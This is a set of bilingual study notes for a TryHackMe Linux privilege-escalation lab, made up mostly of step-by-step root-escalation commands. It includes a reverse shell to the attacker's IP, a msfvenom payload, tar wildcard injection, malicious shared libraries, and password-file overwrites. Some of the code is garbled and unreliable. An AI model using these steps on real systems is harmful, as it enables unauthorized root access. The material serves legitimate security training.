# Linux PrivEsc

[tryhackme_Linux PrivEsc](https://tryhackme.com/room/linuxprivesc?ref=blog.tryhackme.com)


<details>
  <summary>Service Exploits</summary>

## Linux Privilege Escalation via MySQL UDF Exploit

### 🎯 Goal

Gain **root shell access** by exploiting a misconfigured MySQL service (running as root with no password) using a **User Defined Function (UDF)**.

---

### 🔹 Overview

* MySQL is running **as root**.
* The **"root" MySQL user has no password**.
* We'll use a known exploit (`raptor_udf2.c`) to create a MySQL function that executes **system commands as root**.

---

### 🧪 Step-by-Step Instructions

#### 1. 🔧 Go to the exploit directory:

```bash
cd /home/user/tools/mysql-udf
```

#### 2. ⚙️ Compile the UDF exploit code:

```bash
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

* This compiles the `.c` code into a shared object `.so` file.
* `-fPIC` and `-shared` are necessary to load it as a library into MySQL.

#### 3. 🛠️ Connect to MySQL as root (no password):

```bash
mysql -u root
```

#### 4. 📦 Create the custom function in MySQL:

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

* This loads the `.so` file as a **MySQL plugin**.
* It creates a **new function `do_system()`** that can execute system commands.

#### 5. 🧨 Use the function to gain a root shell:

```sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

* Copies `/bin/bash` to `/tmp/rootbash`.
* Sets SUID bit so it runs **with root privileges**.

#### 6. 🚪 Exit MySQL and run root shell:

```bash
exit
/tmp/rootbash -p
```

* `-p` allows bash to run as the **effective UID 0 (root)**.

#### 7. 🧹 Clean Up

```bash
rm /tmp/rootbash
exit
```

* Delete the SUID binary.
* Exit root shell to avoid detection.

---

### ✅ Summary

| Step | Action                                           |
| ---- | ------------------------------------------------ |
| 1    | Compile UDF exploit into `.so` file              |
| 2    | Connect to MySQL (no password)                   |
| 3    | Inject `.so` into MySQL plugin path              |
| 4    | Create and use `do_system()` to copy + SUID bash |
| 5    | Run bash with `-p` for root shell                |
| 6    | Remove `/tmp/rootbash` and exit                  |

🔐 **Always clean up and remove root shells after testing!**

---

🛡️ **Note:** This method only works if:

* MySQL runs as root
* You can connect as root (no password)
* You can write to plugin directory (`/usr/lib/mysql/plugin`)

Used responsibly, this is a great example of **local privilege escalation** via a poorly configured MySQL setup.

  
</details>




<details>
  <summary>Weak File Permissions</summary>

* <details>
    <summary>Readable /etc/shadow</summary>

    ### 1. Readable /etc/shadow (يمكن قراءته)

    * `ls -l /etc/shadow`
        * `-rw-r----- root shadow /etc/shadow` (أي يمكن قرائته)

    * `cat /etc/shadow`
    * (كل اليوزرات بالباسورد تبعها متهاش Hash)

    * **To know type of hash**
        * `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
    * (يكسر ال hash و يقولك على نوعه)
    
  </details>

* <details>
  <summary>Writable /etc/shadow</summary>

   ### 2. Writable /etc/shadow (يمكن الكتابة)

   * (لو الملف ده ينفع تكتب فيه هتمسح الباسورد بتاع ال root user أو admin user وتحط مكانه باسورد من عندك)

   * `mkpasswd -m sha-512 newpassword`    (ممكن تعمل باسورد بالامر ده)
      

   * `su root`
    * (ادخل الباسورد الجديد)
    * !!!مبروك
  
  </details>



* <details>
     <summary>Writable /etc/passwd</summary>

    ### 3. Writable /etc/passwd (يمكن الكتابة)

   * `openssl passwd frank`
    * (لعمل باسورد جديد)
       * `$1$aBcDeF$gH...`

   * `nano /etc/passwd`
       * `root:x:0:0:root:/root:/bin/bash` (remove `x`)
       * Becomes -> `root::0:0:root:/root:/bin/bash` (الباسورد الان فاضي)
       * `root:$1$aBcDeF$gH...:0:0:root:/root:/bin/bash` ( اكتب الباسورد اللى انت عملته مكان ال `x`)

   * `su root`
    * (اكتب الباسورد الجديد و مبروك عليك!!!)


  </details>




  
</details>



<details>
  <summary>Sudo</summary>


* <details>
     <summary>Shell Escape Sequences</summary>

    * `sudo -l`
    * (عرض الأوامر التي يمكن تشغيلها باستخدام Sudo بدون الحاجه لادخال كلمه مرور)
  

    * **`gtfobins.github.io`**
    * (البحث في gtfobins عن أوامر قابلة للاستغلال)

     
  </details>


* <details>
     <summary>Environment Variables</summary>

   * **Environment Variables:** `(LD_LIBRARY_PATH - LD_PRELOAD)`
    * (يمكن نستغل الـ Environment variables دي)
    * **شرح بسيط:** (عشان أي برنامج يعمل لابد يحتاج الى تحميل مكتبات مشتركه لتنفيذ وظائف معينه أماكن هذه المكتبات `Lib` أو `/usr/lib`)
    * (هذه المتغيرات تتحكم في كيف وأين يبحث البرنامج عن مكتبات نقدر نستغلها علشان نوصل بيها للـ root)


    >[!warning] ⚠️⚠️
    >
    > لو عملنا مكتبه تحتوى على كود خبيث (مثلا كود بيفتح `root shell`)
    >
    > وجعلنا **_`LD_PRELOAD`_** يشير اليها فان :
    >
    > اى برنامج يتم تشغيله بصلاحيات ال ``SUDO`` هيقوم اولا بتحميل المكتبه الخبيثه التى انشاناها مم يعطيك صلاحيات ``ROOT``



   This method works if `LD_LIBRARY_PATH` is inherited. It tells a program to look for shared libraries in a specified directory first, allowing you to hijack a library call.

   1.  **Find a target library:**
       * Use `ldd` to see which shared libraries a program uses.

       ```bash
       ldd /usr/sbin/apache2
       ```

   2.  **Create a malicious shared object:**
       * Compile the C code from `/home/user/tools/sudo/library_path.c`.
       * **Crucially, name the output file the same as one of the libraries used by the target program** (e.g., `libcrypt.so.1`).

       ```bash
       gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
       ```

    3.  **Run the program with `LD_LIBRARY_PATH`:**
        * Execute the program using sudo, setting `LD_LIBRARY_PATH` to the directory containing your malicious library (`/tmp`).

        ```bash
        sudo LD_LIBRARY_PATH=/tmp apache2
        ```
  
    * This should also spawn a root shell because the program loads your malicious `libcrypt.so.1` instead of the real one.

   #### **Further thought / exercise:**

   * Try renaming `/tmp/libcrypt.so.1` to the name of another library used by `apache2` and re-run the exploit. Does it still work? If not, why? How would the        `library_path.c` code need to be changed to make it work with a different library?



  </details>

  
</details>


 



<details>
  <summary>Cron Jobs</summary>


* <details>
     <summary>File Permissions</summary>


    # Cron Jobs - File Permissions (Crontab)

   ### 5) Cron Jobs - File Permissions

   * **Cron Job** هو مهمه مجدوله مع تشغيلها تلقائيا في أوقات محدده
    * الملف اللي فيه المهام المجدوله -> `/etc/crontab`

   ---

   **ex:**

   * `cat /etc/crontab`
    * وجدنا أن الملف ده -> `overwrite.sh`
    * الآن نريد تحديد مكانه

   * `locate overwrite.sh`
       * `/usr/local/bin/overwrite.sh`
    * لاقيناه وهنلاحظ انه قابل للتعديل


   * `nano /usr/local/bin/overwrite.sh`
       * `#!/bin/bash`
       * `bash -i >& /dev/tcp/10.0.47.102/4444 0>&1` the ip of ``tun0``
   
    * هنستبدل محتوى الملف بالكود ده
    * الكود ده بيخلى جهاز الضحيه يتصل بنا عن طريق ``NetCat`` على منفذ ``4444``
    * وبعدين نحفظ الملف ونتاكد انه قابل للتنفيذ ``chmod +x``
  

   * `nc -nvlp 4444`
    * ( الآن بنقوم بالإستماع على ال port 4444 )

   * بمجرد ما الملف يخلص شغله هتكون راجعلنا بالجهاز
   * بصلاحية Root عن طريق -> **Reverse Shell**

   * `whoami` 
       * `root`
    * مبروك

     
   </details>



* <details>
     <summary>PATH Environment Variable</summary>


   # Cron Jobs - PATH Environment Variable

   (overwrite.sh لو مينفعش تكتب جواه)

   ### 6) Cron Jobs - PATH Environment variable

   * هنا بنستغل اعدادات الـ PATH الخاصة بالـ Cron Jobs للوصول على صلاحيات الـ `root`

   * `cat /etc/crontab`
       * `PATH=/home/user:/usr/local/sbin:/...`
       * هنا في مشكله هو بيبحث عن الملفات المجدوله زى overwrite.sh
       * لكن بيبدأ البحث في `/home/user` والملف الاصى موجود فى `/usr/local/bin`
       * ده معناه إن لو عملنا ملف بنفس الاسم
       * في `/home/user` وكتبنا فيه كود خبيث يخلينا نحصل صلاحيات `root`

   * `nano /home/user/overwrite.sh`
       * `#!/bin/bash`
       * `cp /bin/bash /tmp/rootbash`
       * `chmod +s /tmp/rootbash`
       * الكود ده بينقل ال ``bash`` ل ``/tmp/rootbash`` وده ملف احنا عملناهو بعد كده يديلو صلاحيات ``SUID``
       * اى ان المستخدم يمكنه تشغيل ``BASH`` بصلاحيات ``root``
    

   * `chmod +x /home/user/overwrite.sh`
       * نخلي الملف قابل للتنفيذ
       * الآن عند تشغيل الـ cron الملف هيتنفذ ما يؤدي الى
       * إنشاء `rootbash` في `/tmp/`

   * `/tmp/rootbash -p`
       * الأمر ده هيخلي `bash` يحتفظ بصلاحيات ال `root`
       * من بعد تشغيله من قبل مستخدم عادي

   * `whoami`
       * `root`


   > ### ليه استخدمنا ``/tmp`` لتخزين الملف
   >
   - > عشان ده مجلد عام يمكن لاى مستخدم يكتب فيه لذا يمكنك انشاء ملفات بدون صلاحيات
   - > معظم الانظمه تمسح الملفات داخل ``/tmp`` تلقائيا عند اعاده التشغيل مما يساعد فى اخفاء الادله بعد الهجوم

     
   </details>



* <details>
     <summary>Wildcards</summary>

   # Cron Jobs - Wildcards

   (مثلا الملف المجدول ده هي `compress.sh`)
   (`` * `` بتنفذ الاوامر على كل الملفات)

   ### 7) Cron Jobs - WildCards

   * استغلال `tar` الذي يعمل داخل المهمة المجدولة للوصول لصلاحيات `root`. وبما ان الأمر `tar` يتم تشغيله باستخدام `*` فسوف نضيف ملفات أسماءها شبيهه لأوامر `tar` ما يمكننا من عمل Reverse Shell والتحكم بالجهاز.

   * `cat /usr/local/bin/compress.sh`
       * `cd /home/user`
       * `tar czf /tmp/backup.tar.gz *` -> (هينفذ كل الاوامر اللي هنا و يوديها ``/tmp``)

   * `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.47.102 LPORT=4444 -f elf -o shell.elf`
       * (على جهازنا، نعمل `shell` عن طريق `msfvenom` باستخدام `shell` لـ linux)

   * `scp shell.elf user@10.10.242.228:/home/user`
       * (بنقوم بنقل الملف لجهاز الضحية)

   * `chmod +x /home/user/shell.elf`
       * (نجعل الملف قابل للتنفيذ)

   * `touch /home/user/--checkpoint=1`
   * `touch /home/user/--checkpoint-action=exec=./shell.elf`

   * `nc -nvlp 4444`
       * (والاستماع على `port 4444` من أجل الحصول على `shell`)

   * `whoami` or `id`
       * `root`



   > ### لماذا ``tar`` كان قابل للاستغلال ؟
   >
   > لان ``tar`` يرى ملفات تحمل اسماء مشابهه لخيارات سطر الاوامر ``--checkpoint=1`` يعتبرها كانها
   > خيارات فعليه او اوامر وليست مجرد اسماء ملفات
   >
   > ### هل يمكن تنفيذ نفس الاستغلال على برامج اخرى ؟
   >
   > نعم مثل :
   >
   > rsync , find , cp , mv , gzip , sort , grep , awk
   >
   > ستجد استغلالهم على gtfobins.io 


     
</details>
  
</details>





<details>
  <summary>SUID / SGID Executables</summary>

* <details>
     <summary>Known Exploits</summary>

   # SUID/SGID Executables - Known Exploits

   ### 8) SUID/SGID Executables - known exploits

   * استغلال البرامج التي تعمل بصلاحيات SUID أو SGID للحصول على صلاحيات الـ `root`.

   * `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
       * البحث عن ملفات تحمل صلاحيات SUID أو SGID.
       * Example found: `/usr/sbin/exim-4.84-3`

   * search on ``exploitDB`` about **_exim-4.84-3_**
       * on this room Found exploit code at: `/home/user/tools/suid/exim/cve.sh`
       * (هنا في كود الاستغلال اللي وجدناه لبرنامج exim)

   * `chmod +x /home/user/tools/suid/exim/cve.sh`

   * `whoami`
       * `root`
       * (مبروك)


  </details>


* <details>
     <summary>Shared Object Injection</summary>


   # SUID/SGID Executables - Shared Object Injection

   ### 9) SUID/SGID executables - Shared object injection

   * هنا ضمن الملفات التي وجدناها تحمل صلاحيات SUID SGID وجدنا الملف: `/usr/local/bin/suid-so`
   * عند محاولة تشغيله يقوم بالتحميل ولكن لا نعرف ماذا يحدث.

   * `strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`
       * عرض العمليات التي يقوم بها الملف من قبل `strace` لفلترة العمليات التى تخص 
       * فتح ملفات او محاولات البحث عن ملفات غير موجوده
       * Example output showing a missing library: `/home/user/.config/libcalc.so`
       * (وجدنا أن الملف يحاول تحميل مكتبه مشفره ولكنه لا يجدها)

   * `mkdir /home/user/.config`
       * (المجلد الذى به الملف)

   * Create the malicious library file (`libcalc.c`):
       * (قم بعمل هذا الملف فى اى مسار على النظام)
       ```c
       #include <stdio.h>
       #include <stdlib.h>

       void _attribute_((constructor)) init() {
           setid(0);
           setلid(0);
           system("/bin/bash");
       }
       ```

   * `gcc -shared -fPIC -o /home/user/.config/libcalc.so ~/path/to/your/libcalc.c`
       * (تم تحويل الكود من الملف إلى مكتبه مشتركه وإرساله الى المسار المراد)

   * `/usr/local/bin/suid-so`
       * (تشغيل الملف مرة أخرى ولكن هذه المرة سوف يجد المكتبة المحقونة وتكون خبيثة)

   * `whoami`
       * `root`
       * (مبروك يا باشا)


  </details>


* <details>
     <summary>Environment Variables</summary>


   # SUID/SGID Executable - Environment Variables

   ### 10) SUID/SGID executable - Environment variables

   * ضمن الملفات التي وجدناها تحمل صلاحيات SUID/SGID وجدنا الملف: `/usr/local/bin/suid-env`
   * عند تشغيل الملف هنلاحظ إنه سيحاول تشغيل Apache2 بس من غير ما يتحددله مسار كامل لتشغيل هذه الخدمة
   * بـ `service apache2 start` (مسار غير كامل).
     * ده مثال للمسار الكامل ``/usr/sbin/servic apache2 atart``

   * `strings /usr/local/bin/suid-env`
       * This shows the program calls `service apache2 start`.

   * `gcc -o service /home/user/tools/service.c`
       * هنعمل ملف باسم `service` فيه كود خبيث مثل الأكواد الخبيثة السابقة ونستخدم `gcc` لإنشاء ملف تنفيذي.

   * `export PATH=.:$PATH/usr/local/bin/suid-env`
       * ولابد أن يبحث النظام في المسار الحالي (`.`) قبل المسارات الأخرى.
          * المسار الحالى ``/home/user``

   * Now run the SUID executable: `/usr/local/bin/suid-env`
       * It will execute your malicious `./service` file instead of the system's `service` command.

   * `whoami`
       * `root`



  </details>


* <details>
     <summary>Abusing Shell Features (#1)</summary>
  </details>


* <details>
     <summary>Abusing Shell Features (#2)</summary>
  </details>



  
</details>

















































